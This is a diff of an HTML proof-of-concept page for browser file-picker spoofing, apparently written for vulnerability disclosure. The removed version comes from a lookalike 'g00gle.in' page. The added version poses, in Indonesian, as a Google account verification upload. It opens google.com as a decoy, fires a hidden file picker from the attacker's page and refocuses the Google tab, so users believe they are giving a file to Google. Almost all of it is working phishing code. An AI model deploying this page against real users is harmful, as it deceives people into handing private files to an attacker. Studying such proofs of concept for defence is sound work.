@@ -1,69 +1,73 @@
-<!-- saved from url=(0035)https://g00gle.in/chromepicker.html -->
-<html class="hydrated">
+<!doctype html>
+<html lang="id">
   <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
-    <style type="text/css" id="operaUserStyle"></style>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/sqrx-email-notifier.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/"
-      data-stencil-namespace="sqrx-email-notifier"
-      id="sqrx-email-notifier"
-    ></script>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/sqrx-dialog.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/"
-      data-stencil-namespace="sqrx-dialog"
-      id="sqrx-dialog"
-    ></script>
-    <script
-      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/sqrx-notification-bar.esm.js"
-      type="module"
-      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/"
-      data-stencil-namespace="sqrx-notification-bar"
-      id="sqrx-notification-bar"
-    ></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PoC File Picker Spoofing</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #fdfdfd;
+      }
+      .container {
+        text-align: center;
+        padding: 30px;
+        border: 1px solid #ddd;
+        border-radius: 12px;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+      }
+      .btn {
+        background-color: #4285F4; /* Google Blue */
+        border: none;
+        color: white;
+        padding: 15px 30px;
+        font-size: 16px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+      .btn:hover {
+        background-color: #357ae8;
+      }
+      input[type="file"] {
+        display: none;
+      }
+    </style>
   </head>
-  <body align="center" onclick="load()" style="color: red; font-size: 24px">
-    Click Here
+  <body>
+
+    <div class="container">
+      <h2>Verifikasi Keamanan Akun</h2>
+      <p>Klik tombol di bawah untuk mengunggah dokumen verifikasi ke Google Drive.</p>
+      <button class="btn" onclick="triggerFileSpoof()">Pilih File untuk Google</button>
+      <input type="file" id="realFilePicker">
+    </div>
 
     <script>
-      async function load() {
-        window.handle = window.showOpenFilePicker();
-        window.open("https://google.com", "_blank");
-        window.handle = (await window.handle)[0];
-        await window.handle.requestPermission();
-        // ...
-        previewImage();
+      function triggerFileSpoof() {
+        // 1. Buka tab Google terlebih dahulu sebagai umpan visual
+        const fakeTab = window.open("https://www.google.com", "fake_target");
+
+        // 2. Berikan sedikit delay agar tab Google terbuka sempurna
+        setTimeout(function () {
+          // 3. Pemicu dialog file picker dari origin penyerang
+          document.getElementById('realFilePicker').click();
+          
+          // 4. Segera pindahkan fokus kembali ke tab Google
+          // Pada beberapa browser, dialog picker tetap akan melayang di atas tab yang aktif
+          fakeTab.focus();
+        }, 1500);
       }
 
-      async function previewImage() {
-        const file = await window.handle.getFile();
-        if (file.type.startsWith("image/")) {
-          const reader = new FileReader();
-          reader.onload = function (event) {
-            const imgElement = document.createElement("img");
-            imgElement.src = event.target.result;
-            document.body.appendChild(imgElement);
-          };
-          reader.readAsDataURL(file);
-        } else {
-          alert("Please choose an image file.");
-        }
-      }
+      // Logika tambahan untuk membuktikan file masuk ke origin penyerang
+      document.getElementById('realFilePicker').onchange = function(e) {
+        alert("File '" + this.files[0].name + "' justru terkirim ke: " + window.location.origin);
+      };
     </script>
-
-    <div id="sqrx-content-container">
-      <div class="squarex_ext_modal">
-        <div class="squarex_ext_dialog-container">
-          <div id="module_dialog_root__disposableFileViewer">
-            <div
-              class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"
-            ></div>
-          </div>
-        </div>
-      </div>
-    </div>
   </body>
 </html>
